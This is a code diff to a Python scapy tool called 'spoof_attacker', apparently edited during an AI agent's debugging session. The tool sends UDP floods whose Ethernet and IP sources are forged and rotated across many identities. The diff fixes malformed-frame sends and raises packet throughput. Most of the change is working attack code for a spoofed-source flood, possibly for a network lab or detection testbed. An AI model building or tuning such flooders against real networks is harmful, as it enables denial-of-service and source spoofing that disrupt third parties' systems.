@@ -170,16 +170,19 @@ def main():
     payload = b"S" * payload_size
     iface = _iface()
 
-    # Precompute raw bytes for each identity so the hot loop avoids
-    # per-packet scapy construction. Single-identity is just a 1-element list.
-    def _mk_pkt_bytes(src_ip, src_mac):
-        return bytes(
+    # Precompute scapy Packet objects for each identity. L2socket.send()
+    # inspects Packet.route()/type to pick ethertype; passing raw bytes
+    # silently sends malformed frames. Pre-building the Packet once per
+    # identity avoids the per-call scapy construction cost while keeping
+    # the objects the socket expects.
+    def _mk_pkt(src_ip, src_mac):
+        return (
             Ether(src=src_mac, dst=dst_mac)
             / IP(src=src_ip, dst=dst_ip)
             / UDP(sport=src_port, dport=target_port)
             / Raw(load=payload)
         )
-    identity_pkts = [_mk_pkt_bytes(ip, mac) for (ip, mac) in identities]
+    identity_pkts = [_mk_pkt(ip, mac) for (ip, mac) in identities]
 
     # Open a persistent L2 socket on the host's interface so we don't pay the
     # open/close/bind cost per packet (that was the ~50 pps cap).
@@ -191,6 +194,10 @@ def main():
         use_l2 = False
         print(f"[spoofer] L2socket open failed ({_e}); falling back to sendp()", file=sys.stderr)
     # #region agent log
+    try:
+        _pkt_size = len(bytes(identity_pkts[0]))
+    except Exception:
+        _pkt_size = -1
     _dbg(
         "src/spoof_attacker.py:socket_ready",
         "spoof send path ready",
@@ -200,6 +207,7 @@ def main():
             "n_identities": len(identities),
             "target_pps": pps,
             "payload_bytes": len(payload),
+            "frame_bytes": _pkt_size,
             "many_identities": many,
         },
         hypothesisId="H3_rate_capped",
@@ -252,24 +260,17 @@ def main():
 
             idx = i % len(identity_pkts)
             i += 1
-            pkt_bytes = identity_pkts[idx]
+            pkt = identity_pkts[idx]
             try:
                 if use_l2:
-                    l2sock.send(pkt_bytes)
+                    l2sock.send(pkt)
                 else:
-                    src_ip, src_mac = identities[idx]
-                    pkt = (
-                        Ether(src=src_mac, dst=dst_mac)
-                        / IP(src=src_ip, dst=dst_ip)
-                        / UDP(sport=src_port, dport=target_port)
-                        / Raw(load=payload)
-                    )
                     sendp(pkt, iface=iface, verbose=False)
             except OSError as e:
                 print(f"[spoofer] send error: {e}", file=sys.stderr)
                 break
             sent += 1
-            bytes_sent += len(pkt_bytes) if use_l2 else (len(payload) + 42)
+            bytes_sent += len(pkt)
             next_send += interval
 
             # Avoid catch-up spiral.
